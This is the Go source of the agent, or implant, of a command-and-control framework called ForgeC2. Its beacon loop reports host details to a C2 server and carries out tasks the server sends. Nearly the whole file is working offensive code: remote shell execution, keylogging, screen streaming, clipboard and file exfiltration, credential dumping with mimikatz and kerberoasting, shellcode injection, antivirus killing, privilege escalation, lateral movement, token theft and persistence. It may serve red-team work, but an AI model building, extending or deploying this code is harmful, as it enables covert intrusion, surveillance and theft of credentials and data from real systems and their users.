//go:build linux || windows
// +build linux windows

package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	mathRand "math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"image/jpeg"
	"image/png"
	"path/filepath"
)

// These variables are injected at compile time via -ldflags "-X main.C2URL=..."
// This source is used exclusively by the Generate Agent flow (EXE).
// IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
var (
	C2URL            string = "http://127.0.0.1:8080"
	IntervalStr      string = "10"
	JitterStr        string = "20"
	UserAgent        string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	PersistStr       string = "false"
	SkipTLSVerifyStr string = "true" // for self-signed C2 certs
	Protocol         string = "http" // "http" or "tcp" injected via ldflags
	DebugStr         string = "false" // set via ldflags for debug builds (stealth default false)
	FastInterval     int    = 1       // Fast interval for screen monitoring (1 second)
	inFastMode       bool   = false
	BeaconURIStr     string = "/api/v1/beacon"
	BeaconMethodStr  string = "POST"
	ListenerIDStr    string = "0"
	P2PMode          string = ""      // "", "smb", "tcp"
	P2PParent        string = ""      // parent agent to connect to (child mode)
	P2PListenAddr    string = ""      // listen addr for children (parent mode)
	DNSDomain        string = ""      // DNS C2 domain (e.g. "c2.example.com")
	DNSServer        string = ""      // DNS C2 server IP
)

// Parsed versions (populated in init)
var (
	Interval      int
	Jitter        int
	Persist       bool
	SkipTLSVerify bool
	Debug         bool
	BeaconURI     string
	BeaconMethod  string
	ListenerID    uint
)

const AgentVersion = "1.2.0" // bump on every release

// Platform-specific implementations (screenshots, persistence, sysproc attrs) are in
// agent_windows.go and agent_linux.go selected by build tags.

// BeaconRequest is sent by agent
type BeaconRequest struct {
	UUID      string            `json:"uuid"`
	Info      map[string]string `json:"info,omitempty"`
	Results   []TaskResult      `json:"results,omitempty"`
	SocksData []socksFrame      `json:"socks_data,omitempty"`
	Relayed   []RelayedData     `json:"relayed,omitempty"` // P2P: child results forwarded by parent
}

type RelayedData struct {
	AgentID string       `json:"agent_id"`
	Results []TaskResult `json:"results"`
}

// TaskResult for completed tasks
type TaskResult struct {
	TaskID   uint   `json:"task_id"`
	Type     string `json:"type"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	Encoding string `json:"encoding,omitempty"`
	Filename string `json:"filename,omitempty"`
	Size     int64  `json:"size,omitempty"`
	Offset   int64  `json:"offset,omitempty"`
	Path     string `json:"path,omitempty"`
}

// BeaconResponse from server
type BeaconResponse struct {
	Tasks         []Task         `json:"tasks"`
	SocksFrames   []socksFrame   `json:"socks_frames,omitempty"`
	SocksFastMode bool           `json:"socks_fast,omitempty"`
	Relayed       []RelayedTask  `json:"relayed,omitempty"` // P2P: tasks for children
}

type RelayedTask struct {
	AgentID string `json:"agent_id"`
	Tasks   []Task `json:"tasks"`
}

// Task from C2
type Task struct {
	ID      uint   `json:"id"`
	Type    string `json:"type"`
	Command string `json:"command"`
	Shell   string `json:"shell"`
	Path    string `json:"path,omitempty"`
	Data    string `json:"data,omitempty"`
	Offset  int64  `json:"offset,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

var (
	client          *http.Client
	agentUUID       string
	rng             = newCryptoRand()
	pendingResults  []TaskResult
	screenStreaming bool

	// P2P relay state
	p2pRelayRunning bool
	p2pRelayMu      sync.Mutex
	p2pChildUUIDs   []string               // UUIDs of children connected through us
	p2pChildResults map[string][]TaskResult // child results to relay
	p2pChildTasks   map[string][]Task       // child tasks to distribute
	p2pChildLastSeen map[string]time.Time   // last-seen timestamp for pruning stale entries

	// Keylogger state (cross platform, impl in platform files)
	keylogActive bool
	keylogMu     sync.Mutex
	keylogBuffer bytes.Buffer
)

// ── SOCKS Relay State (agent side) ───────────────────────────────────────────

type socksFrame struct {
	ConnID uint64 `json:"conn_id"`
	Action string `json:"action"` // connect, connected, data, close
	Data   []byte `json:"data,omitempty"`
}

type socksRelayConn struct {
	tcpConn  net.Conn
	mu       sync.Mutex
	outbound []socksFrame // buffered frames agent→server
	closed   bool
}

const (
	socksOrphanMaxOut = 128           // max orphan control frames to prevent memory leak
	SocksReadTimeout  = 5 * time.Minute // read timeout on target connections
)

var (
	socksRelayMu    sync.Mutex
	socksRelayConns = make(map[uint64]*socksRelayConn)
	socksRelayFast  bool // fast-poll when any SOCKS relay is active
)

func newCryptoRand() *mathRand.Rand {
	seed := make([]byte, 8)
	rand.Read(seed)
	src := mathRand.NewSource(int64(binary.LittleEndian.Uint64(seed)))
	return mathRand.New(src)
}

func init() {
	setDPIAware()

	// Parse injected string values ( -X only supports string )
	var err error
	Interval, err = strconv.Atoi(IntervalStr)
	if err != nil {
		Interval = 10
	}
	Jitter, err = strconv.Atoi(JitterStr)
	if err != nil {
		Jitter = 20
	}
	Persist = strings.ToLower(PersistStr) == "true" || PersistStr == "1"
	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
	Debug = strings.ToLower(DebugStr) == "true" || DebugStr == "1"
	BeaconURI = BeaconURIStr
	if BeaconURI == "" {
		BeaconURI = "/api/v1/beacon"
	}
	BeaconMethod = BeaconMethodStr
	if BeaconMethod == "" {
		BeaconMethod = "POST"
	}
	if id, err := strconv.ParseUint(ListenerIDStr, 10, 32); err == nil {
		ListenerID = uint(id)
	}

	// TLS verification controlled by SkipTLSVerify (injected at build time)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: SkipTLSVerify},
	}
	client = &http.Client{Transport: tr, Timeout: 30 * time.Second}
}

func main() {
	log.SetFlags(0)
	setDPIAware()
	if Debug {
		fmt.Println("[ForgeC2] Agent starting...")
	}

	if Persist {
		addPersistence()
	}

	// Initial registration / first beacon
	agentUUID = registerOrGetUUID()

	// Start P2P parent listener if in parent mode
	if P2PMode != "" && P2PListenAddr != "" {
		go p2pParentListen()
		go p2pCleanupStaleChildren()
		if Debug {
			fmt.Printf("[ForgeC2] P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
		}
	}

	// Main beacon loop
	for {
		doBeacon()
		sleepWithJitter()
	}
}

func sleepWithJitter() {
	baseInterval := Interval
	if inFastMode {
		baseInterval = FastInterval
	}
	base := time.Duration(baseInterval) * time.Second
	jit := float64(Jitter) / 100.0
	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))
	time.Sleep(base + variation)
}

func checkFastMode(tasks []Task) {
	inFastMode = false
	for _, task := range tasks {
		if task.Type == "screenshot" {
			inFastMode = true
			return
		}
	}
}

func registerOrGetUUID() string {
	// On first run, no persisted UUID, server will assign on first beacon
	// For simplicity, we generate here and send, server uses it or creates
	var uuidFile string
	if runtime.GOOS == "windows" {
		uuidFile = os.Getenv("TEMP") + "\\forgec2_uuid.txt"
	} else {
		uuidFile = "/tmp/forgec2_uuid.txt"
	}
	if data, err := os.ReadFile(uuidFile); err == nil && len(data) > 0 {
		return strings.TrimSpace(string(data))
	}
	// Generate new using crypto/rand (RFC 4122 compliant)
	var buf [16]byte
	if _, err := rand.Read(buf[:]); err == nil {
		buf[6] = (buf[6] & 0x0f) | 0x40 // version 4
		buf[8] = (buf[8] & 0x3f) | 0x80 // variant 10
		newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
			buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
		os.WriteFile(uuidFile, []byte(newUUID), 0644)
		return newUUID
	}
	// Fallback (should never happen)
	newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		rng.Uint32(), rng.Uint32()&0xffff, rng.Uint32()&0xffff|0x4000,
		rng.Uint32()&0x3fff|0x8000, rng.Uint64())
	os.WriteFile(uuidFile, []byte(newUUID), 0644)
	return newUUID
}

func doBeacon() {
	info := getSystemInfo()

	// Collect pending SOCKS relay data
	socksData := socksCollectOutbound()
	if len(socksData) > 0 {
		inFastMode = true // fast poll while SOCKS is active
	}

	// Collect P2P child results to relay
	p2pRelayMu.Lock()
	relayedResults := make([]RelayedData, 0)
	for _, childUUID := range p2pChildUUIDs {
		if results, ok := p2pChildResults[childUUID]; ok && len(results) > 0 {
			relayedResults = append(relayedResults, RelayedData{
				AgentID: childUUID,
				Results: results,
			})
			delete(p2pChildResults, childUUID)
		}
	}
	p2pRelayMu.Unlock()

	req := BeaconRequest{
		UUID:      agentUUID,
		Info:      info,
		Results:   pendingResults,
		SocksData: socksData,
		Relayed:   relayedResults,
	}

	pendingResults = nil // sent

	body, _ := json.Marshal(req)

	// P2P child mode: beacon through parent instead of server
	var respBody []byte
	if P2PParent != "" {
		respBody = sendP2PBeacon(body)
	} else if Protocol == "tcp" {
		respBody = sendTCPBeacon(body)
	} else if Protocol == "dns" {
		respBody = sendDNSBeacon(body)
	} else {
		respBody = sendBeacon(body)
	}
	if respBody == nil {
		if Debug {
			fmt.Println("[!] Beacon returned nil, skipping")
		}
		return
	}

	var resp BeaconResponse
	if err := json.Unmarshal(respBody, &resp); err != nil {
		if Debug {
			log.Printf("[!] Failed to parse response: %v", err)
		}
		return
	}

	// Process SOCKS relay frames from server (before tasks, so connect arrives first)
	if len(resp.SocksFrames) > 0 {
		socksProcessFrames(resp.SocksFrames)
	}

	// Distribute relayed tasks to P2P children
	if len(resp.Relayed) > 0 {
		p2pRelayMu.Lock()
		for _, rt := range resp.Relayed {
			p2pChildTasks[rt.AgentID] = append(p2pChildTasks[rt.AgentID], rt.Tasks...)
		}
		p2pRelayMu.Unlock()
	}

	// checkFastMode resets inFastMode, so we set SOCKS hints AFTER it
	checkFastMode(resp.Tasks)

	// SOCKS fast mode overrides (after checkFastMode's reset)
	if resp.SocksFastMode || len(resp.SocksFrames) > 0 || socksRelayFast {
		inFastMode = true
	}
	socksRelayMu.Lock()
	if len(socksRelayConns) > 0 {
		inFastMode = true
	}
	socksRelayMu.Unlock()

	for _, task := range resp.Tasks {
		result := executeTask(task)
		pendingResults = append(pendingResults, result)
	}
}

func sendBeacon(body []byte) []byte {
	req, err := http.NewRequest(BeaconMethod, C2URL+BeaconURI, bytes.NewReader(body))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		if Debug {
			fmt.Printf("[!] Beacon failed: %v\n", err)
		}
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		if Debug {
			fmt.Printf("[!] Server returned %d\n", resp.StatusCode)
		}
		return nil
	}
	data, _ := io.ReadAll(resp.Body)
	return data
}

// p2pCleanupStaleChildren prunes child UUIDs/results/tasks not seen in 10 minutes.
func p2pCleanupStaleChildren() {
	for {
		time.Sleep(5 * time.Minute)
		p2pRelayMu.Lock()
		cutoff := time.Now().Add(-10 * time.Minute)
		keep := make([]string, 0, len(p2pChildUUIDs))
		for _, uuid := range p2pChildUUIDs {
			if last, ok := p2pChildLastSeen[uuid]; ok && last.After(cutoff) {
				keep = append(keep, uuid)
			} else {
				delete(p2pChildResults, uuid)
				delete(p2pChildTasks, uuid)
				delete(p2pChildLastSeen, uuid)
			}
		}
		p2pChildUUIDs = keep
		p2pRelayMu.Unlock()
	}
}

// sendTCPBeacon implements the TCP transport using length-prefixed JSON framing.
// C2URL should be host:port (or tcp://host:port) when Protocol=="tcp".
func sendTCPBeacon(body []byte) []byte {
	addr := strings.TrimPrefix(C2URL, "tcp://")
	addr = strings.TrimPrefix(addr, "tls://")

	var conn net.Conn
	var err error

	// Basic TLS support when SkipTLSVerify or using tls:// scheme
	useTLS := SkipTLSVerify || strings.HasPrefix(C2URL, "tls://")
	if useTLS {
		tlsCfg := &tls.Config{InsecureSkipVerify: SkipTLSVerify}
		conn, err = tls.Dial("tcp", addr, tlsCfg)
	} else {
		conn, err = net.Dial("tcp", addr)
	}
	if err != nil {
		if Debug {
			fmt.Printf("[!] TCP beacon dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()

	// Write length (BE) + body
	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	// Read response length
	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}

	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

func sendTaskResult(res TaskResult) {
	// Reuse beacon mechanism or dedicated, here we do a quick beacon with result
	req := BeaconRequest{
		UUID:    agentUUID,
		Results: []TaskResult{res},
	}
	body, _ := json.Marshal(req)
	if Protocol == "tcp" {
		sendTCPBeacon(body) // fire and forget
	} else if Protocol == "dns" {
		sendDNSBeacon(body) // fire and forget
	} else {
		sendBeacon(body)
	}
}

func sendScreenFrame(data []byte) {
	if Protocol == "tcp" || Protocol == "dns" {
		return
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	req := struct {
		UUID string `json:"uuid"`
		Data string `json:"data"`
	}{
		UUID: agentUUID,
		Data: b64,
	}
	body, _ := json.Marshal(req)
	screenURL := C2URL
	if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
		screenURL = "http://" + screenURL
	}
	httpReq, err := http.NewRequest("POST", screenURL+"/api/v1/screen_frame", bytes.NewReader(body))
	if err != nil {
		return
	}
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("User-Agent", UserAgent)
	client.Do(httpReq) // fire and forget
}

func getSystemInfo() map[string]string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	if username == "" {
		username = "unknown"
	}
	ip := getOutboundIP()

	// Match PS1 behavior: base64 encode sensitive fields + flag encoding
	utf8 := []byte(hostname)
	hostnameB64 := base64.StdEncoding.EncodeToString(utf8)
	usernameB64 := base64.StdEncoding.EncodeToString([]byte(username))
	ipB64 := base64.StdEncoding.EncodeToString([]byte(ip))

	// Process info
	procName, _ := os.Executable()
	if procName != "" {
		procName = filepath.Base(procName)
	}

	// Platform-specific enrichment (integrity, elevated, domain)
	integrity, elevated, domain := getPlatformSecurityInfo()

	info := map[string]string{
		"hostname":    hostnameB64,
		"username":    usernameB64,
		"os":          runtime.GOOS,
		"arch":        runtime.GOARCH,
		"ip":          ipB64,
		"encoding":    "base64",
		"listener_id": fmt.Sprintf("%d", ListenerID),
		"version":     AgentVersion,
		"pid":         strconv.Itoa(os.Getpid()),
		"process_name": procName,
		"integrity":   integrity,
		"elevated":    strconv.FormatBool(elevated),
		"domain":      domain,
		"interval":    strconv.Itoa(Interval),
		"jitter":      strconv.Itoa(Jitter),
	}
	return info
}

func getOutboundIP() string {
	// Simple way to get preferred outbound IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func executeTask(task Task) TaskResult {
	res := TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
	}

	switch task.Type {
	case "shell":
		out, err := runShell(task.Command, task.Shell)
		if err != nil {
			res.Error = err.Error()
		}
		res.Output = out

	case "screenshot":
		data, err := takeScreenshot()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Size = int64(len(data))
			inFastMode = true // speed up next beacons while monitoring
		}

	case "screen_stream_start":
		if !screenStreaming {
			screenStreaming = true
			go func() {
				for screenStreaming {
					data, err := takeScreenshotJPEG(65)
					if err == nil {
						sendScreenFrame(data)
					}
					time.Sleep(150 * time.Millisecond) // ~6-7 fps
				}
			}()
		}
		res.Output = "screen stream started"

	case "screen_stream_stop":
		screenStreaming = false
		res.Output = "screen stream stopped"

	case "keylogger_start":
		if !keylogActive {
			keylogActive = true
			go keyloggerLoop()
		}
		res.Output = "keylogger started"

	case "keylogger_stop":
		keylogActive = false
		res.Output = "keylogger stopped"

	case "keylogger_dump":
		keylogMu.Lock()
		data := keylogBuffer.String()
		keylogBuffer.Reset()
		keylogMu.Unlock()
		if data == "" {
			res.Output = "(no keys logged yet)"
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(data))
			res.Encoding = "base64"
		}

	case "ps":
		out, err := getProcessList()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "suspend":
		out, err := suspendProcess(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "resume":
		out, err := resumeProcess(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "killproc":
		out, err := killProcess(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "clipboard_get":
		out, err := clipboardGet()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "clipboard_set":
		err := clipboardSet(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "clipboard set"
		}

	case "find":
		out, err := findFiles(task.Path, task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "reg_get":
		out, err := regGet(task.Command) // command = "HKCU\Path\Key"
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "reg_set":
		err := regSet(task.Path, task.Data) // path=regpath, data="type|value"
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "reg set"
		}

	case "reg_delete":
		err := regDelete(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "reg deleted"
		}

	case "reboot":
		cmdStr := "shutdown /r /t 0"
		if runtime.GOOS != "windows" {
			cmdStr = "reboot"
		}
		out, err := runShell(cmdStr, "")
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "reboot initiated: " + out
		}

	case "shutdown":
		cmdStr := "shutdown /s /t 0"
		if runtime.GOOS != "windows" {
			cmdStr = "shutdown -h now"
		}
		out, err := runShell(cmdStr, "")
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "shutdown initiated: " + out
		}

	case "drives":
		out, err := listDrives()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "beacon_now":
		// Force immediate next beacon by returning quickly
		res.Output = "beacon forced"

	case "services":
		out, err := listServices()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "portscan":
		out, err := portScan(task.Command) // e.g. "192.168.1.1:80,443" or "10.0.0.0/24:22"
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "netstat":
		out, err := netStat()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "users":
		out, err := listUsers()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "av":
		out, err := detectAV()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "download_url":
		url := task.Command
		dest := task.Path
		if dest == "" {
			dest = task.Shell
		}
		if err := downloadFromURL(url, dest); err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "Downloaded to " + dest
			res.Path = dest
		}

	case "uninstall":
		out, err := uninstallSelf()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "set_sleep":
		// command = "10,20" -> interval,jitter
		parts := strings.Split(task.Command, ",")
		if len(parts) >= 1 {
			if i, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil {
				Interval = i
			}
		}
		if len(parts) >= 2 {
			if j, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
				Jitter = j
			}
		}
		res.Output = fmt.Sprintf("sleep set to %d s, jitter %d%%", Interval, Jitter)

	case "creds":
		out, err := dumpCreds()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "inject":
		// Command = "pid|technique", Data = base64 shellcode
		parts := strings.Split(task.Command, "|")
		if len(parts) < 2 {
			res.Error = "format: pid|technique"
			break
		}
		pid, _ := strconv.Atoi(parts[0])
		tech := parts[1]
		shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
		err := injectProcess(uint32(pid), shellcode, tech)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "inject success"
		}

	case "lateral":
		// Command = "type|target|user|pass|cmd"
		out, err := lateralMove(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "socks":
		// Command = "port" to start local SOCKS5 on target
		port := task.Command
		if port == "" {
			port = "1080"
		}
		go startSocksServer("0.0.0.0:" + port)
		res.Output = "SOCKS5 started on " + port

	case "kill_av":
		out, err := killAV()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "elevate":
		out, err := elevate(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "bof":
		// task.Data = base64 COFF data, task.Command = arguments
		bofData, err := base64.StdEncoding.DecodeString(task.Data)
		if err != nil {
			res.Error = fmt.Sprintf("bof: base64 decode failed: %v", err)
		} else if runtime.GOOS != "windows" {
			res.Error = "bof: Windows-only"
		} else {
			out, err := executeBOF(bofData, task.Command)
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Output = out
			}
		}

	case "elevate_printnightmare":
		out, err := elevatePrintNightmare(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = out
		}

	case "execute_assembly":
		out, err := executeAssembly(task.Data)
		if err != nil {
			res.Error = err.Error()
		} else {
			decoded, _ := base64.StdEncoding.DecodeString(out)
			if decoded != nil {
				res.Output = string(decoded)
			} else {
				res.Output = out
			}
		}

	case "kerberoast":
		out, err := kerberoast()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "mimikatz":
		out, err := runMimikatz(task.Command)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
		}

	case "screenshot_window":
		// simplistic: treat command as window title hint, fallback to full
		data, err := takeScreenshot()
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Size = int64(len(data))
		}

	case "ls":
		path := task.Path
		if path == "" {
			path = task.Command
		}
		out, err := listDirectory(path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
			res.Encoding = "base64"
			res.Path = path
		}

	case "delete":
		path := task.Path
		if path == "" {
			path = task.Command
		}
		err := deleteFileOrDir(path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "Deleted: " + path
			res.Path = path
		}

	case "read":
		path := task.Path
		if path == "" {
			path = task.Command
		}
		data, err := readFileContent(path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Path = path
			res.Size = int64(len(data))
		}

	case "download":
		if strings.HasPrefix(strings.ToLower(task.Command), "http") {
			// URL download to local path (Command = url, Shell or Path = dest path)
			dest := task.Shell
			if dest == "" {
				dest = task.Path
			}
			if dest == "" {
				dest = task.Command[strings.LastIndex(task.Command, "/")+1:]
			}
			if err := downloadFromURL(task.Command, dest); err != nil {
				res.Error = err.Error()
			} else {
				res.Output = "Downloaded to: " + dest
				res.Path = dest
			}
		} else {
			// Agent reads local file chunk and returns content to C2 (exfil)
			path := task.Path
			if path == "" {
				path = task.Command
			}
			offset := task.Offset
			size := task.Size
			if size == 0 {
				size = 1024 * 1024 // default 1MB
			}
			data, err := downloadFileChunk(path, offset, size)
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Output = base64.StdEncoding.EncodeToString(data)
				res.Encoding = "base64"
				res.Path = path
				res.Offset = offset
				res.Size = int64(len(data))
				res.Filename = filepath.Base(path)
			}
		}

	case "upload":
		path := task.Path
		if path == "" {
			path = task.Command
		}
		offset := task.Offset
		if task.Data != "" || task.Shell != "" {
			// Server -> agent file write (push): Data or Shell carries base64 content, at offset
			b64 := task.Data
			if b64 == "" {
				b64 = task.Shell
			}
			err := uploadFileChunk(path, offset, b64)
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Output = "File chunk uploaded successfully"
				res.Path = path
				res.Offset = offset
			}
		} else {
			// Agent -> server file exfil chunk: Path = path to read, at offset
			size := task.Size
			if size == 0 {
				size = 1024 * 1024
			}
			data, err := downloadFileChunk(path, offset, size)
			if err != nil {
				res.Error = err.Error()
			} else {
				res.Output = base64.StdEncoding.EncodeToString(data)
				res.Encoding = "base64"
				res.Path = path
				res.Offset = offset
				res.Size = int64(len(data))
				res.Filename = filepath.Base(path)
			}
		}

	case "kill":
		res.Output = "Agent terminating..."
		sendTaskResult(res) // try to report before exit
		time.Sleep(300 * time.Millisecond)
		os.Exit(0)

	// ── Token Impersonation Tasks ─────────────────────────────────────────────
	case "token_list_procs":
		// Enumerate all processes with their token user info
		if runtime.GOOS != "windows" {
			res.Error = "token ops only on Windows"
			break
		}
		procs, err := tokenListProcesses()
		if err != nil {
			res.Error = err.Error()
		} else {
			data, _ := json.Marshal(procs)
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
		}

	case "token_steal":
		// Command = pid (string)
		if runtime.GOOS != "windows" {
			res.Error = "token ops only on Windows"
			break
		}
		pid, err := strconv.ParseUint(strings.TrimSpace(task.Command), 10, 32)
		if err != nil {
			res.Error = fmt.Sprintf("invalid pid: %v", err)
			break
		}
		dom, user, integ, err := tokenSteal(uint32(pid))
		if err != nil {
			res.Error = err.Error()
		} else {
			// Return structured result
			m := map[string]string{
				"domain":    dom,
				"username":  user,
				"integrity": integ,
				"pid":       task.Command,
				"whoami":    getCurrentTokenUser(),
			}
			data, _ := json.Marshal(m)
			res.Output = string(data)
		}

	case "token_make":
		// Command = "DOMAIN\\user" Shell = password  Path = logon_type (optional)
		if runtime.GOOS != "windows" {
			res.Error = "token ops only on Windows"
			break
		}
		domUser := task.Command
		password := task.Shell
		logonType := task.Path
		dom, user, integ, err := tokenMake(domUser, password, logonType)
		if err != nil {
			res.Error = err.Error()
		} else {
			m := map[string]string{
				"domain":     dom,
				"username":   user,
				"integrity":  integ,
				"logon_type": logonType,
				"whoami":     getCurrentTokenUser(),
			}
			data, _ := json.Marshal(m)
			res.Output = string(data)
		}

	case "token_revert", "rev2self":
		// Drop impersonation and return to process identity
		if runtime.GOOS != "windows" {
			res.Error = "token ops only on Windows"
			break
		}
		if err := tokenRevert(); err != nil {
			res.Error = err.Error()
		} else {
			whoami := getCurrentTokenUser()
			res.Output = fmt.Sprintf(`{"status":"reverted","whoami":%q}`, whoami)
		}

	case "token_whoami":
		// Return current impersonated identity
		if runtime.GOOS != "windows" {
			res.Error = "token ops only on Windows"
			break
		}
		whoami := getCurrentTokenUser()
		res.Output = fmt.Sprintf(`{"whoami":%q}`, whoami)

	default:
		res.Error = "unknown task type: " + task.Type
	}
	return res
}

func runShell(cmdStr, shell string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if shell == "powershell.exe" || strings.Contains(cmdStr, "powershell") {
			cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
		} else {
			cmd = exec.Command("cmd.exe", "/C", cmdStr)
		}
		applyHideWindow(cmd)
	} else {
		// Linux / unix
		if shell == "" || shell == "bash" {
			cmd = exec.Command("bash", "-c", cmdStr)
		} else {
			cmd = exec.Command("sh", "-c", cmdStr)
		}
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	return out.String(), err
}

// setDPIAware, captureScreenRGBA and keyloggerLoop are provided exclusively by
// platform-specific files (agent_windows.go / agent_linux.go) via build tags.

func takeScreenshot() ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, err
	}
	return pngBuf.Bytes(), nil
}

func takeScreenshotJPEG(quality int) ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var jpegBuf bytes.Buffer
	opts := &jpeg.Options{Quality: quality}
	if err := jpeg.Encode(&jpegBuf, img, opts); err != nil {
		return nil, err
	}
	return jpegBuf.Bytes(), nil
}

func addPersistence() {
	// implemented in platform files (full for win, stub for linux)
	if runtime.GOOS == "windows" {
		addPersistenceWindows()
		return
	}
	// Linux stub
	if Debug {
		fmt.Printf("[*] Persistence stub on Linux\n")
	}
}

// suspendProcess / resumeProcess allow pausing (freezing) processes e.g. games.
// target can be PID (e.g. "1234") or executable name (e.g. "game.exe").
// Useful for "pause game" scenarios.
func suspendProcess(target string) (string, error) {
	if runtime.GOOS == "windows" {
		return suspendProcessWindows(target)
	}
	// Linux
	cmd := exec.Command("kill", "-STOP", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("kill -STOP failed: %w: %s", err, string(out))
	}
	return "process suspended: " + target, nil
}

